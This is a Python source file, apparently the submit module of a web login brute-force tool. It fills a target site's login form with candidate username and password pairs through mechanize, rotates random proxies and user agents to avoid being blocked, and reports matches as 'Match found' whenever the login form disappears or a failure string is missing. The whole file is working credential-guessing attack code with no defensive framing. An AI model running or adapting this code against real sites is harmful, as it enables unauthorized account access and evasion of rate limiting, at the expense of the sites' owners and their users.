import mechanize
from core import utils, actions, tbrowser		

def submit(optionURL, tryCred, setProxyList, setKeyFalse, optionVerbose, loginInfo, result):

	#	Get login form field informations
	
	# BUG parse form issue with gmail, move to tbrowser.parseLoginForm
	frmLoginID, frmFields = loginInfo
	tryPassword, tryUsername = tryCred
	
	proc = tbrowser.startBrowser()

	user_agent = tbrowser.useragent()
	proc.addheaders = [('User-Agent', user_agent)]
	
	for cred in list(result.queue):
		if tryUsername == cred[0]:
			return 0 # don't run if find password of username
	
	if setProxyList:
		#Set proxy connect
		proxyAddr = actions.randomFromList(setProxyList)
		proc.set_proxies({"http": proxyAddr})

	
	try:

		proc.open(optionURL)

		#	Select login form

		proc.select_form(nr = frmLoginID)
		
		# FILLS ALL FIELDS https://stackoverflow.com/a/5389578
		
		for field, cred in zip(frmFields, tryCred):
			proc.form[field] = cred

		#	Send request
		proc.submit()

		if optionVerbose:
			utils.printf("Trying: %s:%s" %(tryUsername, tryPassword), 'norm')
			if setProxyList:
				utils.printf("Using proxy: %s" %(proxyAddr), 'norm')
		
		#	Reload - useful for redirect to dashboard
		proc.reload()
		#	If no login form -> success
		#	TODO improve condition to use captcha
		
		if not tbrowser.parseLoginForm(proc.forms()):

			if setKeyFalse:
				if setKeyFalse not in proc.response().read():
					
					# Add creds to success list
					# If verbose: print
					if tryUsername:
						utils.printf("[*] Match found: %s:%s" %(tryUsername, tryPassword), "good")
						#result.put([tryUsername, tryPassword])
					else:
						utils.printf("[*] Password found: %s" %(tryPassword), "good")
						#result.put([tryPassword])
					result.put([tryUsername, tryPassword])

					#	Clear object and try new username

				else:
					if optionVerbose:
						utils.printf("[-] Failed: %s:%s" %(tryUsername, tryPassword), "bad")
					
			else:
				if tryUsername:
					utils.printf("[*] Match found: %s:%s" %(tryUsername, tryPassword), "good")
					#result.put([tryUsername, tryPassword])
				else:
					utils.printf("[*] Password found: %s" %(tryPassword), "good")
					#result.put([tryPassword])
				result.put([tryUsername, tryPassword])

				#	Clear object and try new username
		else:
			if optionVerbose:
				utils.printf("[-] Failed: %s:%s" %(tryUsername, tryPassword), "bad")

	except mechanize.HTTPError as error:
		#	Get blocked
		if optionVerbose:
			utils.printf("[x] Error: %s:%s\n%s" %(tryUsername, tryPassword, error), "bad")
		return False

	except Exception as error:		
		if optionVerbose:
			utils.printf("[x] Error: %s:%s\n%s" %(tryUsername, tryPassword, error), "bad")
		return False
		
	finally:
		proc.close()
	return True